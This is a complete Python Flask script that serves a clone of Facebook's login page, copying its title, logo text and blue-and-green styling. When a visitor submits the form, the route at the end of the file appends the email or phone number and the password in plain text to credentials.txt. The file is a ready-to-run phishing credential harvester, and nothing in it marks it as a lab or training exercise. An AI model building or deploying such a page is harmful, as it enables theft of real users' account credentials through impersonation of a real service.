#!/usr/bin/env python3

from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML template for the login form
login_form_template = '''
<html lang="en">
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Poppins", sans-serif;
      background: #f2f4f7;
    }

    .content {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .flex-div {
      display: flex;
      justify-content: space-evenly;
      align-items: center;
    }

    .name-content {
      margin-right: 7rem;
    }

    .name-content .logo {
      font-size: 3.5rem;
      color: #1877f2;
    }

    .name-content p {
      font-size: 1.3rem;
      font-weight: 500;
      margin-bottom: 5rem;
    }

    form {
      display: flex;
      flex-direction: column;
      background: #fff;
      padding: 2rem;
      width: 530px;
      height: 380px;
      border-radius: 0.5rem;
      box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
    }

    form input {
      outline: none;
      padding: 0.8rem 1rem;
      margin-bottom: 0.8rem;
      font-size: 1.1rem;
    }

    form input:focus {
      border: 1.8px solid #1877f2;
    }

    form .login {
      outline: none;
      border: none;
      background: #1877f2;
      padding: 0.8rem 1rem;
      border-radius: 0.4rem;
      font-size: 1.1rem;
      color: #fff;
    }

    form .login:hover {
      background: #0f71f1;
      cursor: pointer;
    }

    form a {
      text-decoration: none;
      text-align: center;
      font-size: 1rem;
      padding-top: 0.8rem;
      color: #1877f2;
    }

    form hr {
      background: #f7f7f7;
      margin: 1rem;
    }

    form .create-account {
      outline: none;
      border: none;
      background: #06b909;
      padding: 0.8rem 1rem;
      border-radius: 0.4rem;
      font-size: 1.1rem;
      color: #fff;
      width: 75%;
      margin: 0 auto;
    }

    form .create-account:hover {
      background: #03ad06;
      cursor: pointer;
    }

    /* //.........Media Query.........// */

    @media (max-width: 500px) {
      html {
        font-size: 60%;
      }

      .name-content {
        margin: 0;
        text-align: center;
      }

      form {
        width: 300px;
        height: fit-content;
      }

      form input {
        margin-bottom: 1rem;
        font-size: 1.5rem;
      }

      form .login {
        font-size: 1.5rem;
      }

      form a {
        font-size: 1.5rem;
      }

      form .create-account {
        font-size: 1.5rem;
      }

      .flex-div {
        display: flex;
        flex-direction: column;
      }
    }

    @media (min-width: 501px) and (max-width: 768px) {
      html {
        font-size: 60%;
      }

      .name-content {
        margin: 0;
        text-align: center;
      }

      form {
        width: 300px;
        height: fit-content;
      }

      form input {
        margin-bottom: 1rem;
        font-size: 1.5rem;
      }

      form .login {
        font-size: 1.5rem;
      }

      form a {
        font-size: 1.5rem;
      }

      form .create-account {
        font-size: 1.5rem;
      }

      .flex-div {
        display: flex;
        flex-direction: column;
      }
    }

    @media (min-width: 769px) and (max-width: 1200px) {
      html {
        font-size: 60%;
      }

      .name-content {
        margin: 0;
        text-align: center;
      }

      form {
        width: 300px;
        height: fit-content;
      }

      form input {
        margin-bottom: 1rem;
        font-size: 1.5rem;
      }

      form .login {
        font-size: 1.5rem;
      }

      form a {
        font-size: 1.5rem;
      }

      form .create-account {
        font-size: 1.5rem;
      }

      .flex-div {
        display: flex;
        flex-direction: column;
      }

      @media (orientation: landscape) and (max-height: 500px) {
        .header {
          height: 90vmax;
        }
      }  
    }
   

  </style>
  <title>Facebook - log in or sign up</title>
 <head>
   <link rel="icon" href="facebook.png" type="image/x-icon">
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="stylesheet" href="./login_form_2.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
      <form action="/" method="POST">
            <input type="text" name="username" placeholder="Email or Phone Number" required />
            <input type="password" name="password" placeholder="Password" required>
            <button class="login">Log In</button>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button class="create-account">Create New Account</button>
          </form>
      </div>
    </div>
  </body>
  
</html>
'''

# Route for the login form
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Retrieve username and password from the form
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Write username and password to a file
        with open('credentials.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}\n')
    
    return render_template_string(login_form_template)

if __name__ == '__main__':
    app.run(debug=True)

